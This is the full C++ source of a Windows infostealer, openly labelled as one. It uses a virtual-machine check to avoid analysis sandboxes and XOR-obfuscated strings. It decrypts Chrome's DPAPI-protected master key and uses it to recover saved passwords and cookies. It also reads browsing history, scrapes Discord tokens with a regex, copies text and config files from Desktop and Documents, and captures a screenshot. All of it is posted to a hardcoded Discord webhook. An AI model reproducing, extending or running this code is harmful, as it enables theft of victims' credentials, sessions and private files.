#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <intrin.h>
#include <vector>
#include <string>
#include <fstream>
#include <shlobj.h>
#include <iostream>
#include <memory>
#include <regex>
#include <random>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cctype>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "gdi32.lib")

#define WEBHOOK_URL L"https://discord.com/api/webhooks/1552106086671061092/GAamfql3mgtf8prk4oCIV3kodUepTiPZkGQDzxDibcH12Q32eFNV1BuDjT4RtOBoOvcx"
#define WEBHOOK_PATH L"/api/webhooks/1552106086671061092/GAamfql3mgtf8prk4oCIV3kodUepTiPZkGQDzxDibcH12Q32eFNV1BuDjT4RtOBoOvcx"

template <size_t N>
struct XorStr {
    char data[N];
    uint8_t key;
    constexpr XorStr(const char (&str)[N]) : key(0x7B) {
        for (size_t i = 0; i < N; ++i) data[i] = str[i] ^ key;
    }
    std::string get() const {
        std::string res;
        res.reserve(N - 1);
        for (size_t i = 0; i < N - 1; ++i) res += static_cast<char>(data[i] ^ key);
        return res;
    }
};
#define X(s) XorStr<sizeof(s)/sizeof(char)>(s).get()

struct SafeHKEY { HKEY h; SafeHKEY(HKEY h_ = NULL) : h(h_) {} ~SafeHKEY() { if (h) RegCloseKey(h); } operator HKEY() const { return h; } };
struct SafeHINTERNET { HINTERNET h; SafeHINTERNET(HINTERNET h_ = NULL) : h(h_) {} ~SafeHINTERNET() { if (h) WinHttpCloseHandle(h); } operator HINTERNET() const { return h; } };
struct SafeBCRYPTALG { BCRYPT_ALG_HANDLE h; SafeBCRYPTALG(BCRYPT_ALG_HANDLE h_ = NULL) : h(h_) {} ~SafeBCRYPTALG() { if (h) BCryptCloseAlgorithmProvider(h, 0); } operator BCRYPT_ALG_HANDLE() const { return h; } };
struct SafeBCRYPTKEY { BCRYPT_KEY_HANDLE h; SafeBCRYPTKEY(BCRYPT_KEY_HANDLE h_ = NULL) : h(h_) {} ~SafeBCRYPTKEY() { if (h) BCryptDestroyKey(h); } operator BCRYPT_KEY_HANDLE() const { return h; } };

bool IsVM() {
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] & (1 << 31)) != 0) return true;

    char productName[256] = {0};
    DWORD size = sizeof(productName);
    if (RegGetValueA(HKEY_LOCAL_MACHINE, X("SYSTEM\\CurrentControlSet\\Control\\SystemInformation").c_str(), X("SystemProductName").c_str(), RRF_RT_REG_SZ, NULL, productName, &size) == ERROR_SUCCESS) {
        std::string pn(productName);
        if (pn.find(X("VirtualBox")) != std::string::npos || pn.find(X("VMware")) != std::string::npos || pn.find(X("Virtual Machine")) != std::string::npos) {
            return true;
        }
    }
    return false;
}

std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size, NULL, NULL);
    return str;
}

std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size);
    return wstr;
}

std::string Base64Decode(const std::string& in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

std::string GenerateRandomBoundary() {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string boundary = X("----WebKitFormBoundary");
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);
    for (int i = 0; i < 16; ++i) boundary += charset[dis(gen)];
    return boundary;
}

std::string DecryptAESGCM(const std::string& key, const std::string& data) {
    if (data.size() < 31) return "";
    SafeBCRYPTALG hAlg;
    SafeBCRYPTKEY hKey;
    
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg.h, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) return "";

    status = BCryptGenerateSymmetricKey(hAlg, &hKey.h, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) return "";

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)data.data() + 3;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)data.data() + data.size() - 16;
    authInfo.cbTag = 16;

    std::string out(data.size() - 31, 0);
    ULONG cbResult = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)data.data() + 15, (ULONG)data.size() - 31, &authInfo, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &cbResult, 0);

    return BCRYPT_SUCCESS(status) ? out : "";
}

std::string DecryptLegacyDPAPI(const std::string& data) {
    if (data.empty()) return "";
    DATA_BLOB in, out;
    in.pbData = (BYTE*)data.data();
    in.cbData = (DWORD)data.size();
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::string res((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return res;
    }
    return "";
}

typedef int (*sqlite3_open_v2_t)(const char*, void**, int, const char*);
typedef int (*sqlite3_prepare_v2_t)(void*, const char*, int, void**, const char**);
typedef int (*sqlite3_step_t)(void*);
typedef const unsigned char* (*sqlite3_column_text_t)(void*, int);
typedef const void* (*sqlite3_column_blob_t)(void*, int);
typedef int (*sqlite3_column_bytes_t)(void*, int);
typedef int (*sqlite3_finalize_t)(void*);
typedef int (*sqlite3_close_t)(void*);

HMODULE LoadSqlite() {
    HMODULE hSqlite = LoadLibraryA(X("sqlite3.dll").c_str());
    if (!hSqlite) {
        char sqlitePath[MAX_PATH];
        GetSystemDirectoryA(sqlitePath, MAX_PATH);
        strcat_s(sqlitePath, X("\\sqlite3.dll").c_str());
        hSqlite = LoadLibraryA(sqlitePath);
    }
    return hSqlite;
}

std::string ExtractChromiumData() {
    char appdata[MAX_PATH];
    if (!GetEnvironmentVariableA(X("LOCALAPPDATA").c_str(), appdata, MAX_PATH)) return "";

    std::string userDataPath = std::string(appdata) + X("\\Google\\Chrome\\User Data");
    std::string masterKey;
    
    std::string localStatePath = userDataPath + X("\\Local State");
    std::ifstream lsFile(localStatePath);
    if (lsFile.is_open()) {
        std::string content((std::istreambuf_iterator<char>(lsFile)), std::istreambuf_iterator<char>());
        size_t pos = content.find(X("\"encrypted_key\":\""));
        if (pos != std::string::npos) {
            pos += 17;
            size_t end = content.find("\"", pos);
            if (end != std::string::npos) {
                std::string encKeyB64 = content.substr(pos, end - pos);
                std::string encKey = Base64Decode(encKeyB64);
                if (encKey.size() > 5 && encKey.substr(0, 5) == "DPAPI") {
                    DATA_BLOB in, out;
                    in.pbData = (BYTE*)encKey.data() + 5;
                    in.cbData = (DWORD)encKey.size() - 5;
                    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                        masterKey.assign((char*)out.pbData, out.cbData);
                        LocalFree(out.pbData);
                    }
                }
            }
        }
    }

    HMODULE hSqlite = LoadSqlite();
    if (!hSqlite) return "";

    auto sqlite3_open_v2 = (sqlite3_open_v2_t)GetProcAddress(hSqlite, X("sqlite3_open_v2").c_str());
    auto sqlite3_prepare_v2 = (sqlite3_prepare_v2_t)GetProcAddress(hSqlite, X("sqlite3_prepare_v2").c_str());
    auto sqlite3_step = (sqlite3_step_t)GetProcAddress(hSqlite, X("sqlite3_step").c_str());
    auto sqlite3_column_text = (sqlite3_column_text_t)GetProcAddress(hSqlite, X("sqlite3_column_text").c_str());
    auto sqlite3_column_blob = (sqlite3_column_blob_t)GetProcAddress(hSqlite, X("sqlite3_column_blob").c_str());
    auto sqlite3_column_bytes = (sqlite3_column_bytes_t)GetProcAddress(hSqlite, X("sqlite3_column_bytes").c_str());
    auto sqlite3_finalize = (sqlite3_finalize_t)GetProcAddress(hSqlite, X("sqlite3_finalize").c_str());
    auto sqlite3_close = (sqlite3_close_t)GetProcAddress(hSqlite, X("sqlite3_close").c_str());

    std::string result = X("**--- CHROMIUM DATA ---**\n```\n");
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((userDataPath + X("\\*")).c_str(), &fd);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::string profName = fd.cFileName;
                if (profName == "Default" || profName.find("Profile") == 0) {
                    std::string loginDataPath = userDataPath + "\\" + profName + X("\\Login Data");
                    std::string cookieDataPath = userDataPath + "\\" + profName + X("\\Network\\Cookies");
                    std::string tempDir = std::string(getenv("TEMP")) + "\\" + profName + "_";
                    
                    CreateDirectoryA(tempDir.c_str(), NULL);
                    std::string tempLogin = tempDir + "login.db";
                    std::string tempCookie = tempDir + "cookie.db";

                    bool loginCopied = false;
                    bool cookieCopied = false;
                    
                    for (int retry = 0; retry < 3; retry++) {
                        if (!loginCopied && CopyFileA(loginDataPath.c_str(), tempLogin.c_str(), FALSE)) {
                            CopyFileA((loginDataPath + "-wal").c_str(), (tempLogin + "-wal").c_str(), FALSE);
                            CopyFileA((loginDataPath + "-shm").c_str(), (tempLogin + "-shm").c_str(), FALSE);
                            loginCopied = true;
                        }
                        if (!cookieCopied && CopyFileA(cookieDataPath.c_str(), tempCookie.c_str(), FALSE)) {
                            CopyFileA((cookieDataPath + "-wal").c_str(), (tempCookie + "-wal").c_str(), FALSE);
                            CopyFileA((cookieDataPath + "-shm").c_str(), (tempCookie + "-shm").c_str(), FALSE);
                            cookieCopied = true;
                        }
                        if (loginCopied && cookieCopied) break;
                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    }

                    void* db;
                    if (sqlite3_open_v2 && sqlite3_open_v2(tempLogin.c_str(), &db, 1, NULL) == 0) {
                        void* stmt;
                        if (sqlite3_prepare_v2 && sqlite3_prepare_v2(db, X("SELECT origin_url, username_value, password_value FROM logins").c_str(), -1, &stmt, NULL) == 0) {
                            while (sqlite3_step && sqlite3_step(stmt) == 100) {
                                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                                const char* user = (const char*)sqlite3_column_text(stmt, 1);
                                const void* blob = sqlite3_column_blob ? sqlite3_column_blob(stmt, 2) : NULL;
                                int blobLen = sqlite3_column_bytes ? sqlite3_column_bytes(stmt, 2) : 0;
                                
                                if (blob && blobLen > 15) {
                                    std::string encPass((const char*)blob, blobLen);
                                    std::string decPass = encPass.substr(0, 3) == "v10" ? DecryptAESGCM(masterKey, encPass) : DecryptLegacyDPAPI(encPass);
                                    if (!decPass.empty()) {
                                        result += "[PASS] " + std::string(url ? url : "") + " | " + (user ? user : "") + " | " + decPass + "\n";
                                    }
                                }
                            }
                            if (sqlite3_finalize) sqlite3_finalize(stmt);
                        }
                        if (sqlite3_close) sqlite3_close(db);
                    }

                    if (sqlite3_open_v2 && sqlite3_open_v2(tempCookie.c_str(), &db, 1, NULL) == 0) {
                        void* stmt;
                        if (sqlite3_prepare_v2 && sqlite3_prepare_v2(db, X("SELECT host_key, name, encrypted_value FROM cookies").c_str(), -1, &stmt, NULL) == 0) {
                            while (sqlite3_step && sqlite3_step(stmt) == 100) {
                                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                                const void* blob = sqlite3_column_blob ? sqlite3_column_blob(stmt, 2) : NULL;
                                int blobLen = sqlite3_column_bytes ? sqlite3_column_bytes(stmt, 2) : 0;
                                
                                if (blob && blobLen > 15) {
                                    std::string encCookie((const char*)blob, blobLen);
                                    std::string decCookie = encCookie.substr(0, 3) == "v10" ? DecryptAESGCM(masterKey, encCookie) : DecryptLegacyDPAPI(encCookie);
                                    if (!decCookie.empty()) {
                                        result += "[COOKIE] " + std::string(host ? host : "") + " | " + (name ? name : "") + " | " + decCookie + "\n";
                                    }
                                }
                            }
                            if (sqlite3_finalize) sqlite3_finalize(stmt);
                        }
                        if (sqlite3_close) sqlite3_close(db);
                    }

                    DeleteFileA(tempLogin.c_str());
                    DeleteFileA((tempLogin + "-wal").c_str());
                    DeleteFileA((tempLogin + "-shm").c_str());
                    DeleteFileA(tempCookie.c_str());
                    DeleteFileA((tempCookie + "-wal").c_str());
                    DeleteFileA((tempCookie + "-shm").c_str());
                    RemoveDirectoryA(tempDir.c_str());
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    result += X("```\n");
    FreeLibrary(hSqlite);
    return result;
}

std::string ExtractChromiumHistory() {
    char appdata[MAX_PATH];
    if (!GetEnvironmentVariableA(X("LOCALAPPDATA").c_str(), appdata, MAX_PATH)) return "";

    std::string userDataPath = std::string(appdata) + X("\\Google\\Chrome\\User Data");
    std::string result = X("**--- CHROMIUM HISTORY ---**\n```\n");

    HMODULE hSqlite = LoadSqlite();
    if (!hSqlite) return "";

    auto sqlite3_open_v2 = (sqlite3_open_v2_t)GetProcAddress(hSqlite, X("sqlite3_open_v2").c_str());
    auto sqlite3_prepare_v2 = (sqlite3_prepare_v2_t)GetProcAddress(hSqlite, X("sqlite3_prepare_v2").c_str());
    auto sqlite3_step = (sqlite3_step_t)GetProcAddress(hSqlite, X("sqlite3_step").c_str());
    auto sqlite3_column_text = (sqlite3_column_text_t)GetProcAddress(hSqlite, X("sqlite3_column_text").c_str());
    auto sqlite3_finalize = (sqlite3_finalize_t)GetProcAddress(hSqlite, X("sqlite3_finalize").c_str());
    auto sqlite3_close = (sqlite3_close_t)GetProcAddress(hSqlite, X("sqlite3_close").c_str());

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((userDataPath + X("\\*")).c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::string profName = fd.cFileName;
                if (profName == "Default" || profName.find("Profile") == 0) {
                    std::string historyPath = userDataPath + "\\" + profName + X("\\History");
                    std::string tempDir = std::string(getenv("TEMP")) + "\\" + profName + "_hist";
                    CreateDirectoryA(tempDir.c_str(), NULL);
                    std::string tempHist = tempDir + "\\history.db";

                    if (CopyFileA(historyPath.c_str(), tempHist.c_str(), FALSE)) {
                        void* db;
                        if (sqlite3_open_v2 && sqlite3_open_v2(tempHist.c_str(), &db, 1, NULL) == 0) {
                            void* stmt;
                            if (sqlite3_prepare_v2 && sqlite3_prepare_v2(db, X("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50").c_str(), -1, &stmt, NULL) == 0) {
                                while (sqlite3_step && sqlite3_step(stmt) == 100) {
                                    const char* url = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* title = (const char*)sqlite3_column_text(stmt, 1);
                                    result += "[HIST] " + std::string(title ? title : "") + " | " + std::string(url ? url : "") + "\n";
                                }
                                if (sqlite3_finalize) sqlite3_finalize(stmt);
                            }
                            if (sqlite3_close) sqlite3_close(db);
                        }
                        DeleteFileA(tempHist.c_str());
                    }
                    RemoveDirectoryA(tempDir.c_str());
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    result += X("```\n");
    FreeLibrary(hSqlite);
    return result;
}

std::string GrabConfigFiles() {
    std::string result = X("**--- CONFIG & TEXT FILES ---**\n```\n");
    std::vector<std::string> folders;
    char path[MAX_PATH];

    if (GetEnvironmentVariableA(X("USERPROFILE").c_str(), path, MAX_PATH)) {
        folders.push_back(std::string(path) + X("\\Desktop"));
        folders.push_back(std::string(path) + X("\\Documents"));
    }

    std::vector<std::string> extensions = { ".txt", ".json", ".cfg", ".ini", ".log" };
    const DWORD MAX_FILE_SIZE = 64 * 1024;

    for (const auto& folder : folders) {
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA((folder + X("\\*")).c_str(), &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string fileName = fd.cFileName;
                size_t dotPos = fileName.find_last_of(".");
                if (dotPos == std::string::npos) continue;
                std::string ext = fileName.substr(dotPos);
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                bool match = false;
                for (const auto& e : extensions) {
                    if (ext == e) { match = true; break; }
                }

                if (match && fd.nFileSizeLow < MAX_FILE_SIZE) {
                    std::string src = folder + "\\" + fileName;
                    std::ifstream file(src, std::ios::binary);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        result += "[FILE] " + fileName + "\n" + content + "\n---\n";
                    }
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    result += X("```\n");
    return result;
}

std::vector<std::string> ExtractTokensFromFile(const std::string& filePath) {
    std::vector<std::string> tokens;
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) return tokens;

    std::regex token_regex(R"([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}|mfa\.[a-zA-Z0-9_-]{84})");
    const size_t CHUNK_SIZE = 65536;
    const size_t OVERLAP = 100;
    
    std::vector<char> buffer(CHUNK_SIZE + OVERLAP);
    size_t currentOverlap = 0;

    while (file) {
        file.read(buffer.data() + currentOverlap, CHUNK_SIZE);
        std::streamsize bytesRead = file.gcount();
        
        if (bytesRead == 0 && currentOverlap == 0) break;

        size_t processLen = currentOverlap + bytesRead;
        std::string chunk(buffer.data(), processLen);
        
        auto begin = std::sregex_iterator(chunk.begin(), chunk.end(), token_regex);
        auto end = std::sregex_iterator();
        for (auto i = begin; i != end; ++i) {
            tokens.push_back(i->str());
        }

        if (bytesRead == CHUNK_SIZE) {
            std::copy(buffer.data() + CHUNK_SIZE, buffer.data() + CHUNK_SIZE + OVERLAP, buffer.data());
            currentOverlap = OVERLAP;
        } else {
            break;
        }
    }
    return tokens;
}

std::string ExtractDiscordTokens() {
    char localAppData[MAX_PATH];
    if (!GetEnvironmentVariableA(X("LOCALAPPDATA").c_str(), localAppData, MAX_PATH)) return "";
    char roamingAppData[MAX_PATH];
    if (!GetEnvironmentVariableA(X("APPDATA").c_str(), roamingAppData, MAX_PATH)) return "";

    std::vector<std::string> discordPaths = {
        std::string(localAppData) + X("\\Discord\\Local Storage\\leveldb"),
        std::string(localAppData) + X("\\DiscordCanary\\Local Storage\\leveldb"),
        std::string(localAppData) + X("\\DiscordPTB\\Local Storage\\leveldb"),
        std::string(roamingAppData) + X("\\Discord\\Local Storage\\leveldb")
    };

    std::string result = X("**--- DISCORD TOKENS ---**\n```\n");
    std::vector<std::string> found_tokens;

    for (const auto& path : discordPaths) {
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA((path + X("\\*.ldb")).c_str(), &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            hFind = FindFirstFileA((path + X("\\*.log")).c_str(), &fd);
        }

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string filePath = path + "\\" + fd.cFileName;
                std::vector<std::string> chunkTokens = ExtractTokensFromFile(filePath);
                
                for (const auto& token : chunkTokens) {
                    if (std::find(found_tokens.begin(), found_tokens.end(), token) == found_tokens.end()) {
                        found_tokens.push_back(token);
                        result += token + "\n";
                    }
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }

    std::string discordCookiePath = std::string(roamingAppData) + X("\\Discord\\Network\\Cookies");
    if (GetFileAttributesA(discordCookiePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        HMODULE hSqlite = LoadSqlite();
        if (hSqlite) {
            auto sqlite3_open_v2 = (sqlite3_open_v2_t)GetProcAddress(hSqlite, X("sqlite3_open_v2").c_str());
            auto sqlite3_prepare_v2 = (sqlite3_prepare_v2_t)GetProcAddress(hSqlite, X("sqlite3_prepare_v2").c_str());
            auto sqlite3_step = (sqlite3_step_t)GetProcAddress(hSqlite, X("sqlite3_step").c_str());
            auto sqlite3_column_text = (sqlite3_column_text_t)GetProcAddress(hSqlite, X("sqlite3_column_text").c_str());
            auto sqlite3_column_blob = (sqlite3_column_blob_t)GetProcAddress(hSqlite, X("sqlite3_column_blob").c_str());
            auto sqlite3_column_bytes = (sqlite3_column_bytes_t)GetProcAddress(hSqlite, X("sqlite3_column_bytes").c_str());
            auto sqlite3_finalize = (sqlite3_finalize_t)GetProcAddress(hSqlite, X("sqlite3_finalize").c_str());
            auto sqlite3_close = (sqlite3_close_t)GetProcAddress(hSqlite, X("sqlite3_close").c_str());

            std::string tempDir = std::string(getenv("TEMP")) + "\\discord_";
            CreateDirectoryA(tempDir.c_str(), NULL);
            std::string tempCookie = tempDir + "cookie.db";

            if (CopyFileA(discordCookiePath.c_str(), tempCookie.c_str(), FALSE)) {
                CopyFileA((discordCookiePath + "-wal").c_str(), (tempCookie + "-wal").c_str(), FALSE);
                CopyFileA((discordCookiePath + "-shm").c_str(), (tempCookie + "-shm").c_str(), FALSE);

                void* db;
                if (sqlite3_open_v2 && sqlite3_open_v2(tempCookie.c_str(), &db, 1, NULL) == 0) {
                    void* stmt;
                    if (sqlite3_prepare_v2 && sqlite3_prepare_v2(db, X("SELECT host_key, name, encrypted_value FROM cookies").c_str(), -1, &stmt, NULL) == 0) {
                        while (sqlite3_step && sqlite3_step(stmt) == 100) {
                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
                            const char* name = (const char*)sqlite3_column_text(stmt, 1);
                            const void* blob = sqlite3_column_blob ? sqlite3_column_blob(stmt, 2) : NULL;
                            int blobLen = sqlite3_column_bytes ? sqlite3_column_bytes(stmt, 2) : 0;
                            
                            if (blob && blobLen > 15) {
                                std::string encCookie((const char*)blob, blobLen);
                                std::string decCookie = DecryptLegacyDPAPI(encCookie);
                                if (!decCookie.empty() && std::find(found_tokens.begin(), found_tokens.end(), decCookie) == found_tokens.end()) {
                                    found_tokens.push_back(decCookie);
                                    result += "[DISCORD_COOKIE] " + std::string(host ? host : "") + " | " + (name ? name : "") + " | " + decCookie + "\n";
                                }
                            }
                        }
                        if (sqlite3_finalize) sqlite3_finalize(stmt);
                    }
                    if (sqlite3_close) sqlite3_close(db);
                }

                DeleteFileA(tempCookie.c_str());
                DeleteFileA((tempCookie + "-wal").c_str());
                DeleteFileA((tempCookie + "-shm").c_str());
                RemoveDirectoryA(tempDir.c_str());
            }
            FreeLibrary(hSqlite);
        }
    }

    result += X("```\n");
    return result;
}

void SendWebhook(const std::string& json, const std::vector<BYTE>& img) {
    SafeHINTERNET hSession(WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
    SafeHINTERNET hConnect(WinHttpConnect(hSession, L"discord.com", 443, 0));
    SafeHINTERNET hRequest(WinHttpOpenRequest(hConnect, L"POST", WEBHOOK_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE));

    std::string boundary = GenerateRandomBoundary();
    std::string header = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
    
    std::string body = "--" + boundary + "\r\n"
                       "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" + json + "\r\n"
                       "--" + boundary + "\r\n"
                       "Content-Disposition: form-data; name=\"file\"; filename=\"screen.bmp\"\r\n"
                       "Content-Type: image/bmp\r\n\r\n";
    
    std::string footer = "\r\n--" + boundary + "--\r\n";

    std::vector<BYTE> payload;
    payload.insert(payload.end(), body.begin(), body.end());
    payload.insert(payload.end(), img.begin(), img.end());
    payload.insert(payload.end(), footer.begin(), footer.end());

    if (!WinHttpSendRequest(hRequest, StringToWString(header).c_str(), (DWORD)header.length(), payload.data(), (DWORD)payload.size(), (DWORD)payload.size(), 0)) return;
    if (!WinHttpReceiveResponse(hRequest, NULL)) return;

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        if (statusCode != 200 && statusCode != 204) return;
    }
}

std::vector<BYTE> TakeScreenshot() {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdc = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hdc);
    HBITMAP hBmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hMemDC, hBmp);
    
    BitBlt(hMemDC, 0, 0, w, h, hdc, x, y, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD bmpSize = ((w * 24 + 31) / 32) * 4 * h;
    std::vector<BYTE> pixels(bmpSize);
    GetDIBits(hdc, hBmp, 0, h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    BITMAPFILEHEADER bfh = {};
    bfh.bfType = 0x4D42;
    bfh.bfSize = sizeof(bfh) + sizeof(bi) + bmpSize;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bi);

    std::vector<BYTE> bmpFile;
    bmpFile.reserve(bfh.bfSize);
    bmpFile.insert(bmpFile.end(), (BYTE*)&bfh, (BYTE*)&bfh + sizeof(bfh));
    bmpFile.insert(bmpFile.end(), (BYTE*)&bi, (BYTE*)&bi + sizeof(bi));
    bmpFile.insert(bmpFile.end(), pixels.begin(), pixels.end());

    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hdc);
    return bmpFile;
}

int main() {
    if (IsVM()) return 0;

    std::vector<BYTE> screen = TakeScreenshot();
    std::string report = X("**--- INFOSTEALER REPORT ---**\n");
    
    std::string discordData = ExtractDiscordTokens();
    if (!discordData.empty()) report += "\n" + discordData;
    
    std::string chromeData = ExtractChromiumData();
    if (!chromeData.empty()) report += "\n" + chromeData;

    std::string historyData = ExtractChromiumHistory();
    if (!historyData.empty()) report += "\n" + historyData;

    std::string configData = GrabConfigFiles();
    if (!configData.empty()) report += "\n" + configData;

    SendWebhook(report, screen);
    return 0;
}
